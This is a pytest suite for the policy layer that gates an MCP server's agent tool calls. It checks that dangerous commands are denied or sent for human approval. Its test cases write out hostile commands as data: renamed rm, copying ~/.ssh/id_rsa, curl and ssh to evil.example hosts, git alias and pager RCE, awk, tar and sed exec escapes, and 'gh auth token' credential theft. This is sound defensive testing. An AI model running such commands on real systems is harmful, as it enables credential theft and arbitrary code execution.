"""
Behavioral tests for the K1 policy chokepoint (mcp_server/policy.py +
server.py:call_tool enforcement).

Follows the Phase 0 behavioral-harness principle: every assertion is about
what the policy DOES to a real call — real symlinks/copies on disk, real
binary resolution, real dispatch through server.call_tool — never about
source text.

Covers the exit criteria of Phase 1 (docs/ROADMAP_TO_10.md):
  - every registered MCP tool passes through policy.enforce before dispatch
  - a renamed `rm` (symlink AND copy) is blocked or approval-gated
  - a `python -c` one-liner is approval-gated
  - `cp ~/.ssh/id_rsa /tmp` is blocked
plus the allow/deny/approve matrix and the argv-rule table.
"""

from __future__ import annotations

import asyncio
import os
import shutil
import stat

import pytest

from mcp_server import policy


def enforce(name, args):
    return policy.enforce(name, args)


@pytest.fixture(autouse=True)
def _no_threshold(monkeypatch):
    """Default: gate off (matrix tests opt in via monkeypatch.setenv)."""
    monkeypatch.delenv("KIM_HITL_RISK_THRESHOLD", raising=False)


# ---------------------------------------------------------------------------
# Exit-criteria attacks
# ---------------------------------------------------------------------------

class TestRenamedRm:
    def test_symlink_named_ls_pointing_at_rm_is_denied(self, tmp_path):
        """`ln -s /bin/rm innocent` — the resolved real binary is rm → deny."""
        rm = shutil.which("rm") or "/bin/rm"
        link = tmp_path / "innocent"
        link.symlink_to(rm)
        d = enforce("run_command", {"cmd": f"{link} -rf some_dir"})
        assert d.action == "deny"
        assert d.reason == "denylisted_binary"

    def test_copied_rm_under_allowlisted_name_is_gated(self, tmp_path):
        """`cp /bin/rm ./ls` — right name, wrong location → approval, not allow."""
        rm = shutil.which("rm") or "/bin/rm"
        copy = tmp_path / "ls"
        shutil.copy(rm, copy)
        copy.chmod(copy.stat().st_mode | stat.S_IEXEC)
        d = enforce("run_command", {"cmd": f"{copy} -rf some_dir"})
        assert d.action in ("deny", "approve")
        assert d.action == "approve"
        assert "untrusted_binary_location" in d.escalations

    def test_copied_binary_under_random_name_is_gated(self, tmp_path):
        rm = shutil.which("rm") or "/bin/rm"
        copy = tmp_path / "totally_fine"
        shutil.copy(rm, copy)
        copy.chmod(copy.stat().st_mode | stat.S_IEXEC)
        d = enforce("run_command", {"cmd": f"{copy} -rf x"})
        assert d.action == "approve"
        assert "binary_not_allowlisted" in d.escalations

    def test_plain_rm_still_denied(self):
        d = enforce("run_command", {"cmd": "rm -rf build"})
        assert d.action == "deny"


class TestInlineInterpreterExec:
    def test_python_dash_c_is_approval_gated_even_without_threshold(self):
        d = enforce("run_command", {"cmd": "python3 -c \"print('hi')\""})
        assert d.action == "approve"
        assert "inline_interpreter_exec" in d.escalations

    def test_python_script_file_is_not_escalated(self):
        d = enforce("run_command", {"cmd": "python3 scripts/gen.py"})
        assert d.action == "allow"

    def test_node_eval_is_gated(self):
        d = enforce("run_command", {"cmd": "node -e 'process.exit(0)'"})
        assert d.action == "approve"

    def test_bash_c_wrapping_rm_is_denied_via_recursion(self):
        d = enforce("run_command", {"cmd": "bash -c 'rm -rf /'"})
        assert d.action == "deny"

    def test_bash_c_wrapping_benign_is_still_gated(self):
        d = enforce("run_command", {"cmd": "bash -c 'echo hi'"})
        assert d.action == "approve"
        assert "inline_interpreter_exec" in d.escalations


class TestSensitivePathArguments:
    def test_cp_ssh_key_to_tmp_is_denied(self):
        """The S3 headline gap: exfiltrating a key with an allowlisted binary."""
        d = enforce("run_command", {"cmd": "cp ~/.ssh/id_rsa /tmp"})
        assert d.action == "deny"
        assert d.reason == "sensitive_path_argument"

    def test_cat_absolute_out_of_sandbox_path_is_denied(self):
        d = enforce("run_command", {"cmd": "cat /etc/passwd"})
        assert d.action == "deny"

    def test_parent_traversal_escaping_root_is_denied(self):
        depth = len(policy.PROJECT_ROOT.parts) + 2
        escape = "/".join([".."] * depth) + "/etc/passwd"
        d = enforce("run_command", {"cmd": f"cat {escape}"})
        assert d.action == "deny"

    def test_dev_null_redirect_target_is_fine(self):
        d = enforce("run_command", {"cmd": "ls > /dev/null"})
        assert d.action == "allow"

    def test_relative_project_paths_are_fine(self):
        d = enforce("run_command", {"cmd": "cat README.md"})
        assert d.action == "allow"

    def test_git_ref_with_slashes_is_not_a_path(self):
        d = enforce("run_command", {"cmd": "git log origin/main..HEAD"})
        assert d.action == "allow"


# ---------------------------------------------------------------------------
# S3 — path-typed args on non-shell tools
# ---------------------------------------------------------------------------

class TestPathTypedToolArgs:
    @pytest.mark.parametrize("tool,args", [
        ("read_file", {"path": "~/.ssh/id_rsa"}),
        ("write_file", {"path": "~/.ssh/authorized_keys", "content": "evil"}),
        ("delete_file", {"path": "/etc/hosts"}),
        ("list_dir", {"path": "~/.aws"}),
        ("run_python", {"file": "~/.ssh/id_rsa"}),
        ("lint_file", {"path": "/etc/passwd"}),
        ("search_in_files", {"pattern": "key", "path": "~/.ssh"}),
        ("find_files", {"pattern": "*", "path": "~/.gnupg"}),
        ("git_add", {"paths": ["~/.ssh/id_rsa"]}),
        ("read_file", {"path": ".env"}),
        ("run_command", {"cmd": "ls", "cwd": "/etc"}),
    ])
    def test_sensitive_or_outside_paths_deny(self, tool, args):
        d = enforce(tool, args)
        assert d.action == "deny", f"{tool}({args}) should be denied, got {d}"
        assert d.reason == "sensitive_path_argument"

    def test_project_relative_paths_allow(self):
        assert enforce("read_file", {"path": "README.md"}).action == "allow"
        assert enforce("list_dir", {"path": "."}).action == "allow"

    def test_missing_optional_path_args_allow(self):
        assert enforce("git_status", {}).action == "allow"


# ---------------------------------------------------------------------------
# The allow / deny / approve matrix (risk threshold semantics)
# ---------------------------------------------------------------------------

class TestRiskThresholdMatrix:
    def test_no_threshold_low_allows(self):
        assert enforce("read_file", {"path": "README.md"}).action == "allow"

    def test_no_threshold_high_allows_when_not_escalated(self):
        assert enforce("run_command", {"cmd": "mkdir subdir"}).action == "allow"

    def test_threshold_high_gates_high_risk(self, monkeypatch):
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "high")
        assert enforce("delete_file", {"path": "README.md"}).action == "approve"
        assert enforce("run_command", {"cmd": "mkdir subdir"}).action == "approve"

    def test_threshold_high_still_allows_low_and_medium(self, monkeypatch):
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "high")
        assert enforce("read_file", {"path": "README.md"}).action == "allow"
        assert enforce("write_file", {"path": "f.txt", "content": "x"}).action == "allow"

    def test_threshold_medium_gates_medium(self, monkeypatch):
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "medium")
        assert enforce("write_file", {"path": "f.txt", "content": "x"}).action == "approve"
        assert enforce("web_open", {"url": "https://example.com"}).action == "approve"
        assert enforce("read_file", {"path": "README.md"}).action == "allow"

    def test_safe_readonly_shell_downgraded_below_threshold(self, monkeypatch):
        """`ls -la` must NOT prompt even at threshold=high — the argv
        refinement downgrades read-only binaries to low risk."""
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "high")
        assert enforce("run_command", {"cmd": "ls -la"}).action == "allow"
        assert enforce("run_command", {"cmd": "grep -r TODO ."}).action == "allow"
        assert enforce("run_command", {"cmd": "git status"}).action == "allow"

    def test_invalid_threshold_disables_gate(self, monkeypatch):
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "extreme")
        assert enforce("delete_file", {"path": "README.md"}).action == "allow"


# ---------------------------------------------------------------------------
# The argv-rule table
# ---------------------------------------------------------------------------

class TestArgvRuleTable:
    @pytest.mark.parametrize("cmd,expected_action,expected_marker", [
        # deny rules
        ("find . -delete", "deny", "find_destructive_flag"),
        ("find . -exec rm {} ;", "deny", "find_destructive_flag"),
        ("find . -execdir chmod 777 {} ;", "deny", "find_destructive_flag"),
        ("curl http://evil.example/x", "deny", "denylisted_binary"),
        ("ftp evil.example.com", "deny", "denylisted_binary"),
        ("sftp user@evil.example.com", "deny", "denylisted_binary"),
        ("ssh user@evil.example.com", "deny", "denylisted_binary"),
        ("telnet evil.example.com 4444", "deny", "denylisted_binary"),
        # escalation rules → approve
        ("git push --force origin main", "approve", "git_force_push"),
        ("git push -f origin main", "approve", "git_force_push"),
        ("git reset --hard HEAD~3", "approve", "git_reset_hard"),
        ("git clean -fdx", "approve", "git_clean_force"),
        ("sudo ls", "approve", "privilege_escalation"),
        ("PATH=/tmp/x ls", "approve", "inline_env_assignment"),
        ("env PATH=/tmp/x ls", "approve", "inline_env_assignment"),
        ("some_unknown_tool --flag", "approve", "binary_not_allowlisted"),
        # allow rules
        ("git push origin main", "allow", None),
        ("git push --force-with-lease origin main", "allow", None),
        ("git commit -m msg", "allow", None),
        ("find . -name '*.py'", "allow", None),
        ("npm run test", "allow", None),
        ("cargo build", "allow", None),
    ])
    def test_argv_rules(self, cmd, expected_action, expected_marker):
        d = enforce("run_command", {"cmd": cmd})
        assert d.action == expected_action, f"{cmd!r}: expected {expected_action}, got {d}"
        if expected_marker and expected_action == "approve":
            assert expected_marker in d.escalations, (
                f"{cmd!r}: expected escalation {expected_marker}, got {d.escalations}"
            )
        if expected_marker and expected_action == "deny":
            assert d.reason == expected_marker

    def test_git_readonly_subcommands_are_low_risk(self, monkeypatch):
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "high")
        for sub in ("status", "diff", "log", "show"):
            d = enforce("run_command", {"cmd": f"git {sub}"})
            assert d.action == "allow", f"git {sub} should not prompt"

    def test_config_allowlist_extra_extends_the_allowlist(self, monkeypatch):
        d = enforce("run_command", {"cmd": "mytool --version"})
        assert d.action == "approve"  # unknown binary
        monkeypatch.setattr(
            policy, "get_config",
            lambda: {"shell": {"allowlist_extra": ["mytool"]}},
        )
        # still escalated if the binary can't be resolved on PATH; an
        # allowlisted name resolved through PATH would be trusted. Use a real
        # binary name to prove the extension works end to end.
        monkeypatch.setattr(
            policy, "get_config",
            lambda: {"shell": {"safe_extra": ["osascript"]}},
        )
        d = enforce("run_command", {"cmd": "osascript -e 'return 1'"})
        assert d.action == "allow"

    def test_run_powershell_is_threshold_gated(self, monkeypatch):
        monkeypatch.setenv("KIM_HITL_RISK_THRESHOLD", "high")
        d = enforce("run_powershell", {"script": "Get-ChildItem"})
        assert d.action == "approve"

    def test_run_powershell_escalates_even_without_threshold(self):
        """The PS escalation is unconditional — no threshold config needed."""
        d = enforce("run_powershell", {"script": "Get-ChildItem"})
        assert d.action == "approve"
        assert d.reason == "powershell_script_unanalyzed"

    def test_run_powershell_secret_path_is_denied_not_approved(self):
        """A PS script referencing a secret-sandbox path must hard-deny
        (parity with run_command's _scan_path_tokens arm) — a human should
        never even see an approval card for it."""
        d = enforce("run_powershell", {"script": "Get-Content ~/.ssh/id_rsa"})
        assert d.action == "deny"
        assert d.reason == "sensitive_path_argument"

    def test_run_powershell_env_file_is_denied(self):
        d = enforce("run_powershell", {"script": "Get-Content ~/.env"})
        assert d.action == "deny"
        assert d.reason == "sensitive_path_argument"

    def test_run_powershell_glued_separator_path_is_denied(self):
        """PS separators glued to the path token still get scanned."""
        d = enforce(
            "run_powershell",
            {"script": "echo hi; type ~/.aws/credentials|Out-Null"},
        )
        assert d.action == "deny"
        assert d.reason == "sensitive_path_argument"

    def test_run_powershell_malformed_quoting_still_escalates(self):
        """Unparseable scripts fall back to whitespace split; the
        unconditional human-approval escalation still applies."""
        d = enforce("run_powershell", {"script": 'Write-Host "unterminated'})
        assert d.action == "approve"
        assert d.reason == "powershell_script_unanalyzed"

    def test_run_python_always_requires_approval_even_without_threshold(self):
        """The audit's headline finding: hitl_risk_threshold is unset by
        default, so run_python's inline `code` argument must be gated by an
        unconditional escalation, not the (inert) threshold arm."""
        d = enforce("run_python", {"code": "print('hi')"})
        assert d.action == "approve"
        assert "mandatory_code_execution_approval" in d.escalations

    def test_run_node_always_requires_approval_even_without_threshold(self):
        d = enforce("run_node", {"code": "console.log('hi')"})
        assert d.action == "approve"
        assert "mandatory_code_execution_approval" in d.escalations

    def test_run_python_inline_code_bypassing_blocklist_still_gated(self):
        """A hardcoded absolute path trivially bypasses the code.py string
        blocklist (no `os`/`subprocess` token at all) — policy must still
        gate it, since the blocklist is not the real control."""
        d = enforce(
            "run_python",
            {"code": "open('/Users/x/.ssh/id_rsa').read()"},
        )
        assert d.action == "approve"
        assert "mandatory_code_execution_approval" in d.escalations

    def test_run_python_approval_signature_scoped_to_code_not_bare_tool_name(self):
        """Approving one run_python call must not silently pre-approve a
        DIFFERENT run_python call via 'accept for session' (G5 regression)."""
        d1 = enforce("run_python", {"code": "print(1)"})
        d2 = enforce("run_python", {"code": "print(2)"})
        assert d1.signature != d2.signature

    def test_run_python_file_arg_also_requires_approval(self):
        """Unconditional escalation covers the whole tool, not just inline
        code -- a .py file path is validated by S3 but still needs a human."""
        d = enforce("run_python", {"file": "scripts/gen.py"})
        assert d.action == "approve"
        assert "mandatory_code_execution_approval" in d.escalations

    def test_run_python_sensitive_path_still_denied_before_approval(self):
        """S3 deny still wins over the unconditional-approve escalation."""
        d = enforce("run_python", {"file": "~/.ssh/id_rsa"})
        assert d.action == "deny"
        assert d.reason == "sensitive_path_argument"

    def test_policy_never_raises_it_denies(self):
        """Fail-closed: garbage input yields deny, not an exception."""
        d = enforce("run_command", {"cmd": 'cat "unterminated'})
        assert d.action == "deny"


# ---------------------------------------------------------------------------
# The chokepoint: every registered tool goes through enforce before dispatch
# ---------------------------------------------------------------------------

class TestCallToolChokepoint:
    def test_deny_all_policy_blocks_every_registered_tool(self, monkeypatch):
        """With enforce patched to deny, NO handler may run for ANY tool."""
        from mcp_server import server as srv

        ran: list[str] = []

        def _fake_handler_for(tool_name):
            async def _h(args):
                ran.append(tool_name)
                return "ran"
            return _h

        for tool_name in list(srv._DISPATCH):
            monkeypatch.setitem(srv._DISPATCH, tool_name, _fake_handler_for(tool_name))
        monkeypatch.setattr(
            srv.policy, "enforce",
            lambda name, args: policy.PolicyDecision(
                action="deny", risk="high", reason="test",
                message="POLICY_DENIED: test",
            ),
        )

        async def _run_all():
            for tool_name in list(srv._DISPATCH):
                result = await srv.call_tool(tool_name, {})
                assert "POLICY_DENIED" in result.content[0].text, tool_name

        asyncio.run(_run_all())
        assert ran == [], f"handlers ran despite deny-all policy: {ran}"

    def test_allow_path_dispatches_handler(self, monkeypatch):
        from mcp_server import server as srv

        async def _h(args):
            return "handler-output"

        monkeypatch.setitem(srv._DISPATCH, "read_file", _h)
        result = asyncio.run(srv.call_tool("read_file", {"path": "README.md"}))
        assert result.content[0].text == "handler-output"

    def test_deny_result_reaches_the_caller_verbatim(self):
        from mcp_server import server as srv

        result = asyncio.run(
            srv.call_tool("run_command", {"cmd": "cp ~/.ssh/id_rsa /tmp"})
        )
        assert "POLICY_DENIED" in result.content[0].text

    def test_unknown_tool_still_reports_unknown(self):
        from mcp_server import server as srv

        result = asyncio.run(srv.call_tool("no_such_tool", {}))
        assert "Unknown tool" in result.content[0].text


# ---------------------------------------------------------------------------
# Sanity: the live shell handler agrees with policy on the headline attacks
# (defense-in-depth: even if policy were bypassed, shell.py still denies rm)
# ---------------------------------------------------------------------------

class TestDefenseInDepthStillPresent:
    def test_shell_denylist_still_blocks_plain_rm(self):
        from mcp_server.tools.shell import _check_blocked
        assert _check_blocked("rm -rf /") is not None

    def test_shell_metachar_block_still_present(self):
        from mcp_server.tools.shell import _check_blocked
        assert _check_blocked("echo hi; rm -rf /") is not None


# ---------------------------------------------------------------------------
# F-C-1 / F-C-2 / F-C-3 — the argv-level exec-capable-binary escapes must be a
# hard POLICY_DENIED at the CHOKEPOINT (not merely blocked inside the handler),
# with the risk-threshold arm OFF (default config). Mirrors the shell.py table.
# ---------------------------------------------------------------------------

class TestExecCapableArgvEscapesDeniedAtChokepoint:
    @pytest.mark.parametrize("cmd", [
        # F-C-1: git config-injection RCE / secret read
        "git -c 'alias.pwn=!id' pwn",
        "git -c core.pager=/tmp/evil log",
        "git --config-env core.sshCommand=EVIL fetch",
        "sudo git -c alias.x=!id x",
        # F-C-2: awk / tar / sed / make. (Cases whose argv contains an absolute
        # path — e.g. `/etc/passwd` — are also denied here, but via the earlier
        # `_scan_path_tokens` arm; these use non-absolute targets so the deny is
        # attributable to the exec-capable-argv arm specifically. The
        # `/regex/`-addressed sed residual's home is the shell.py handler — at
        # the policy layer a `/…`-shaped script token is caught by the path
        # scanner first, which is also a deny.)
        "awk 'BEGIN{system(\"id\")}'",
        "tar --checkpoint-action=exec=id -cf out.tar .",
        "sed 'e id' file",
        "sed 'w outfile' file",
        "make -f Makefile.evil",
        # F-C-3: gh credential exfiltration
        "gh auth token",
        "gh auth status --show-token",
    ])
    def test_escape_is_denied(self, cmd):
        d = enforce("run_command", {"cmd": cmd})
        assert d.action == "deny", f"{cmd!r} should be denied, got {d.action}"
        assert d.reason == "exec_capable_argv_escape"
        assert "POLICY_DENIED" in d.message

    @pytest.mark.parametrize("cmd", [
        "git status",
        "git -c user.email=x@y.z commit -m msg",
        "awk '{print $1}' file",
        "tar -xzf archive.tgz",
        "sed 's/a/b/g' file",
        "sed '/foo/d' file",
        "make build",
        "gh pr list",
        "gh auth status",
    ])
    def test_benign_not_denied_for_escape(self, cmd):
        d = enforce("run_command", {"cmd": cmd})
        assert d.reason != "exec_capable_argv_escape", (
            f"benign {cmd!r} wrongly flagged as an escape"
        )


if os.environ.get("KIM_POLICY_TEST_DEBUG"):
    def test_dump_decision_for_debug():
        print(enforce("run_command", {"cmd": "ls -la"}))
